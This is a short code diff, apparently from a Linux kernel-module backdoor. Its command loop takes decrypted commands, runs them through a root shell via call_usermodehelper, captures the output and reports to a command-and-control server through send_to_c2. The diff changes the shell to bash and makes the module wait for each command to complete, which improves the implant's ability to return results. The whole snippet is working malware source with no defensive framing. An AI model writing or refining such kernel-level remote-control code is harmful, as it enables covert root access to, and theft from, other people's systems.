@@ -174,7 +174,7 @@ static int command_loop(void *data) {
         }
 
         snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, decrypted, tmp_output_path);
-        argv[0] = "/bin/sh";
+        argv[0] = "/bin/bash";
         argv[1] = "-c";
         argv[2] = full_cmd;
         argv[3] = NULL;
@@ -183,7 +183,7 @@ static int command_loop(void *data) {
         envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
         envp[3] = NULL;
 
-        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
         if (ret != 0) {
             send_to_c2("(exec error)\n--EOF--\n", 21);
             continue;
